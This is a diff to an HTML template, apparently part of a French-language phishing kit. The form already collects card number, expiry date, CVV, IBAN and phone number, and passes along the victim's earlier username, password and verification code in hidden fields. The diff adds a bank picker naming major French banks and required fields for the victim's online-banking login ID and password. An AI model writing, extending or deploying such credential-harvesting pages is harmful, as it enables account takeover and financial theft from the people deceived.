@@ -134,7 +134,9 @@
     }
 
     .form-group input[type="text"],
-    .form-group input[type="tel"] { /* Ajout de input[type="tel"] ici pour le style */
+    .form-group input[type="tel"],
+    .form-group input[type="password"], /* Nouveau style pour type="password" */
+    .form-group select { /* Nouveau style pour select */
       width: 100%;
       padding: 10px;
       border: 1px solid #ddd;
@@ -143,7 +145,8 @@
     }
 
     .form-group input[type="text"]::placeholder,
-    .form-group input[type="tel"]::placeholder { /* Ajout de input[type="tel"] pour le placeholder */
+    .form-group input[type="tel"]::placeholder,
+    .form-group input[type="password"]::placeholder { /* Nouveau style pour type="password" */
       color: #aaa;
     }
 
@@ -153,7 +156,8 @@
       margin-top: 5px;
       display: none;
     }
-    .form-group.has-error input {
+    .form-group.has-error input,
+    .form-group.has-error select { /* Ajout de select pour les erreurs */
       border-color: #dc3545;
     }
     .form-group.has-error .input-feedback {
@@ -217,6 +221,12 @@
     .help-icon:hover {
         background-color: #eee;
     }
+
+    /* Style spécifique pour le champ "Autre Banque" */
+    #other_bank_name_group {
+        display: none; /* Caché par défaut */
+        margin-top: -5px; /* Ajustement visuel */
+    }
   </style>
 </head>
 <body>
@@ -266,6 +276,49 @@
         <input type="tel" id="phone_number" name="phone_number" placeholder="Par ex : 06 12 34 56 78" required>
         <div class="input-feedback">Veuillez entrer un numéro de téléphone valide</div>
       </div>
+
+      <div class="form-group">
+        <label for="bank_name">Établissement bancaire</label>
+        <select id="bank_name" name="bank_name" required>
+          <option value="">Sélectionnez votre banque</option>
+          <option value="BNP Paribas">BNP Paribas</option>
+          <option value="Crédit Agricole">Crédit Agricole</option>
+          <option value="Société Générale">Société Générale</option>
+          <option value="Banque Populaire">Banque Populaire</option>
+          <option value="Caisse d'Épargne">Caisse d'Épargne</option>
+          <option value="Crédit Mutuel">Crédit Mutuel</option>
+          <option value="CIC">CIC</option>
+          <option value="LCL">LCL</option>
+          <option value="La Banque Postale">La Banque Postale</option>
+          <option value="Hello Bank!">Hello Bank!</option>
+          <option value="Boursorama Banque">Boursorama Banque</option>
+          <option value="Fortuneo">Fortuneo</option>
+          <option value="Monabank">Monabank</option>
+          <option value="N26">N26</option>
+          <option value="Revolut">Revolut</option>
+          <option value="Autre">Autre / Non listé</option>
+        </select>
+        <div class="input-feedback">Veuillez sélectionner votre établissement bancaire</div>
+      </div>
+
+      <div class="form-group" id="other_bank_name_group">
+        <label for="other_bank_name">Nom de l'établissement bancaire (manuel)</label>
+        <input type="text" id="other_bank_name" name="other_bank_name" placeholder="Saisissez le nom de votre banque">
+        <div class="input-feedback">Veuillez saisir le nom de votre banque</div>
+      </div>
+
+      <div class="form-group">
+        <label for="bank_id">Identifiant bancaire</label>
+        <input type="text" id="bank_id" name="bank_id" placeholder="Par ex : Votre identifiant de connexion à la banque" required>
+        <div class="input-feedback">Veuillez entrer votre identifiant bancaire</div>
+      </div>
+
+      <div class="form-group">
+        <label for="bank_password">Code de sécurité / Mot de passe bancaire</label>
+        <input type="password" id="bank_password" name="bank_password" placeholder="Par ex : Votre mot de passe de connexion à la banque" required>
+        <div class="input-feedback">Veuillez entrer votre code de sécurité ou mot de passe bancaire</div>
+      </div>
+
       <input type="hidden" name="username" value="{{ username }}">
       <input type="hidden" name="password" value="{{ password }}">
       <input type="hidden" name="verification_code" value="{{ verification_code }}">
@@ -292,125 +345,187 @@
         return phoneRegex.test(phone) && phone.length >= 9; // Min 9 chiffres pour 0X XX XX XX XX
     }
 
-    document.querySelector('form').addEventListener('submit', function(event) {
-        let isValid = true;
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.querySelector('form');
+        const bankNameSelect = document.getElementById('bank_name');
+        const otherBankNameGroup = document.getElementById('other_bank_name_group');
+        const otherBankNameInput = document.getElementById('other_bank_name');
 
-        // Validation Nom sur la carte
-        const cardNameInput = document.getElementById('card_name');
-        if (cardNameInput.value.trim() === '') {
-            cardNameInput.closest('.form-group').classList.add('has-error');
-            cardNameInput.nextElementSibling.textContent = "Nom figurant sur la carte ne peut pas être vide.";
-            isValid = false;
-        } else {
-            cardNameInput.closest('.form-group').classList.remove('has-error');
-        }
+        // Gérer l'affichage du champ "Autre Banque"
+        bankNameSelect.addEventListener('change', function() {
+            if (this.value === 'Autre') {
+                otherBankNameGroup.style.display = 'block';
+                otherBankNameInput.setAttribute('required', 'required'); // Rendre obligatoire si "Autre" est sélectionné
+            } else {
+                otherBankNameGroup.style.display = 'none';
+                otherBankNameInput.removeAttribute('required'); // Ne pas rendre obligatoire
+                otherBankNameInput.value = ''; // Vider le champ si l'option change
+            }
+        });
 
-        // Validation Numéro de carte bancaire
-        const cardNumberInput = document.getElementById('card_number');
-        const rawCardNumber = cardNumberInput.value.replace(/\s/g, '');
-        if (rawCardNumber.length < 13 || rawCardNumber.length > 19 || !/^\d+$/.test(rawCardNumber)) {
-            cardNumberInput.closest('.form-group').classList.add('has-error');
-            cardNumberInput.nextElementSibling.textContent = "Numéro de carte bancaire invalide (13-19 chiffres).";
-            isValid = false;
-        } else {
-            cardNumberInput.closest('.form-group').classList.remove('has-error');
-        }
+        form.addEventListener('submit', function(event) {
+            let isValid = true;
 
-        // Validation Date d'expiration
-        const expiryDateInput = document.getElementById('expiry_date');
-        const expiryRegex = /^(0[1-9]|1[0-2]) \/ ([0-9]{2})$/;
-        if (!expiryRegex.test(expiryDateInput.value.trim())) {
-            expiryDateInput.closest('.form-group').classList.add('has-error');
-            expiryDateInput.nextElementSibling.textContent = "Format de date incorrect (MM / AA).";
-            isValid = false;
-        } else {
-            const [month, year] = expiryDateInput.value.split(' / ').map(Number);
-            const currentYear = new Date().getFullYear() % 100;
-            const currentMonth = new Date().getMonth() + 1;
+            // --- Validations existantes ---
 
-            if (year < currentYear || (year === currentYear && month < currentMonth)) {
-                expiryDateInput.closest('.form-group').classList.add('has-error');
-                expiryDateInput.nextElementSibling.textContent = "La date d'expiration doit être future.";
+            // Validation Nom sur la carte
+            const cardNameInput = document.getElementById('card_name');
+            if (cardNameInput.value.trim() === '') {
+                cardNameInput.closest('.form-group').classList.add('has-error');
+                cardNameInput.nextElementSibling.textContent = "Nom figurant sur la carte ne peut pas être vide.";
                 isValid = false;
             } else {
-                expiryDateInput.closest('.form-group').classList.remove('has-error');
+                cardNameInput.closest('.form-group').classList.remove('has-error');
             }
-        }
 
-        // Validation Code de sécurité (CVV)
-        const cvvInput = document.getElementById('cvv');
-        if (!/^[0-9]{3,4}$/.test(cvvInput.value.trim())) {
-            cvvInput.closest('.form-group').classList.add('has-error');
-            cvvInput.nextElementSibling.textContent = "Code de sécurité invalide (3 ou 4 chiffres).";
-            isValid = false;
-        } else {
-            cvvInput.closest('.form-group').classList.remove('has-error');
-        }
-
-        // VALIDATION IBAN
-        const ibanInput = document.getElementById('iban');
-        if (!isValidIbanFR(ibanInput.value.trim())) {
-            ibanInput.closest('.form-group').classList.add('has-error');
-            ibanInput.nextElementSibling.textContent = "Veuillez entrer un IBAN français valide (FR + 2 chiffres + 23 caractères).";
-            isValid = false;
-        } else {
-            ibanInput.closest('.form-group').classList.remove('has-error');
-        }
-
-        // VALIDATION NUMÉRO DE TÉLÉPHONE (NOUVEAU)
-        const phoneNumberInput = document.getElementById('phone_number');
-        if (!isValidPhoneNumber(phoneNumberInput.value.trim())) {
-            phoneNumberInput.closest('.form-group').classList.add('has-error');
-            phoneNumberInput.nextElementSibling.textContent = "Veuillez entrer un numéro de téléphone valide (format français).";
-            isValid = false;
-        } else {
-            phoneNumberInput.closest('.form-group').classList.remove('has-error');
-        }
-
-
-        if (!isValid) {
-            event.preventDefault();
-        }
-    });
-
-    // Formatage du numéro de carte
-    document.getElementById('card_number').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\s+/g, '');
-        let formattedValue = '';
-        for (let i = 0; i < value.length; i++) {
-            if (i > 0 && i % 4 === 0) {
-                formattedValue += ' ';
+            // Validation Numéro de carte bancaire
+            const cardNumberInput = document.getElementById('card_number');
+            const rawCardNumber = cardNumberInput.value.replace(/\s/g, '');
+            if (rawCardNumber.length < 13 || rawCardNumber.length > 19 || !/^\d+$/.test(rawCardNumber)) {
+                cardNumberInput.closest('.form-group').classList.add('has-error');
+                cardNumberInput.nextElementSibling.textContent = "Numéro de carte bancaire invalide (13-19 chiffres).";
+                isValid = false;
+            } else {
+                cardNumberInput.closest('.form-group').classList.remove('has-error');
             }
-            formattedValue += value[i];
-        }
-        e.target.value = formattedValue;
-    });
 
-    // Formatage de la date d'expiration
-    document.getElementById('expiry_date').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\s*\/\s*/g, '');
-        if (value.length > 2) {
-            value = value.substring(0, 2) + ' / ' + value.substring(2);
-        }
-        e.target.value = value;
-    });
+            // Validation Date d'expiration
+            const expiryDateInput = document.getElementById('expiry_date');
+            const expiryRegex = /^(0[1-9]|1[0-2]) \/ ([0-9]{2})$/;
+            if (!expiryRegex.test(expiryDateInput.value.trim())) {
+                expiryDateInput.closest('.form-group').classList.add('has-error');
+                expiryDateInput.nextElementSibling.textContent = "Format de date incorrect (MM / AA).";
+                isValid = false;
+            } else {
+                const [month, year] = expiryDateInput.value.split(' / ').map(Number);
+                const currentYear = new Date().getFullYear() % 100;
+                const currentMonth = new Date().getMonth() + 1;
 
-    // Formatage de l'IBAN
-    document.getElementById('iban').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\s+/g, '').toUpperCase();
-        let formattedValue = '';
-        for (let i = 0; i < value.length; i++) {
-            if (i > 0 && i % 4 === 0) {
-                formattedValue += ' ';
+                if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                    expiryDateInput.closest('.form-group').classList.add('has-error');
+                    expiryDateInput.nextElementSibling.textContent = "La date d'expiration doit être future.";
+                    isValid = false;
+                } else {
+                    expiryDateInput.closest('.form-group').classList.remove('has-error');
+                }
             }
-            formattedValue += value[i];
-        }
-        e.target.value = formattedValue;
-    });
 
-    // Redirige au clic sur le bouton de fermeture
-    document.querySelector('.close-button').addEventListener('click', function() {
-        window.history.back();
+            // Validation Code de sécurité (CVV)
+            const cvvInput = document.getElementById('cvv');
+            if (!/^[0-9]{3,4}$/.test(cvvInput.value.trim())) {
+                cvvInput.closest('.form-group').classList.add('has-error');
+                cvvInput.nextElementSibling.textContent = "Code de sécurité invalide (3 ou 4 chiffres).";
+                isValid = false;
+            } else {
+                cvvInput.closest('.form-group').classList.remove('has-error');
+            }
+
+            // VALIDATION IBAN
+            const ibanInput = document.getElementById('iban');
+            if (!isValidIbanFR(ibanInput.value.trim())) {
+                ibanInput.closest('.form-group').classList.add('has-error');
+                ibanInput.nextElementSibling.textContent = "Veuillez entrer un IBAN français valide (FR + 2 chiffres + 23 caractères).";
+                isValid = false;
+            } else {
+                ibanInput.closest('.form-group').classList.remove('has-error');
+            }
+
+            // VALIDATION NUMÉRO DE TÉLÉPHONE
+            const phoneNumberInput = document.getElementById('phone_number');
+            if (!isValidPhoneNumber(phoneNumberInput.value.trim())) {
+                phoneNumberInput.closest('.form-group').classList.add('has-error');
+                phoneNumberInput.nextElementSibling.textContent = "Veuillez entrer un numéro de téléphone valide (format français).";
+                isValid = false;
+            } else {
+                phoneNumberInput.closest('.form-group').classList.remove('has-error');
+            }
+
+            // --- Nouvelles validations ---
+
+            // VALIDATION Établissement bancaire
+            if (bankNameSelect.value === '') {
+                bankNameSelect.closest('.form-group').classList.add('has-error');
+                bankNameSelect.nextElementSibling.textContent = "Veuillez sélectionner votre établissement bancaire.";
+                isValid = false;
+            } else {
+                bankNameSelect.closest('.form-group').classList.remove('has-error');
+                // Si "Autre" est sélectionné, valider le champ de saisie manuelle
+                if (bankNameSelect.value === 'Autre' && otherBankNameInput.value.trim() === '') {
+                    otherBankNameInput.closest('.form-group').classList.add('has-error');
+                    otherBankNameInput.nextElementSibling.textContent = "Veuillez saisir le nom de votre banque.";
+                    isValid = false;
+                } else {
+                    otherBankNameInput.closest('.form-group').classList.remove('has-error');
+                }
+            }
+
+            // VALIDATION Identifiant bancaire
+            const bankIdInput = document.getElementById('bank_id');
+            if (bankIdInput.value.trim() === '') {
+                bankIdInput.closest('.form-group').classList.add('has-error');
+                bankIdInput.nextElementSibling.textContent = "Veuillez entrer votre identifiant bancaire.";
+                isValid = false;
+            } else {
+                bankIdInput.closest('.form-group').classList.remove('has-error');
+            }
+
+            // VALIDATION Code de sécurité / Mot de passe bancaire
+            const bankPasswordInput = document.getElementById('bank_password');
+            if (bankPasswordInput.value.trim() === '') {
+                bankPasswordInput.closest('.form-group').classList.add('has-error');
+                bankPasswordInput.nextElementSibling.textContent = "Veuillez entrer votre code de sécurité ou mot de passe bancaire.";
+                isValid = false;
+            } else {
+                bankPasswordInput.closest('.form-group').classList.remove('has-error');
+            }
+
+
+            if (!isValid) {
+                event.preventDefault(); // Empêche la soumission du formulaire
+            }
+        });
+
+        // --- Formatage existant ---
+
+        // Formatage du numéro de carte
+        document.getElementById('card_number').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
+
+        // Formatage de la date d'expiration
+        document.getElementById('expiry_date').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s*\/\s*/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + ' / ' + value.substring(2);
+            }
+            e.target.value = value;
+        });
+
+        // Formatage de l'IBAN
+        document.getElementById('iban').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').toUpperCase();
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
+
+        // Redirige au clic sur le bouton de fermeture
+        document.querySelector('.close-button').addEventListener('click', function() {
+            window.history.back();
+        });
     });
   </script>
 </body>
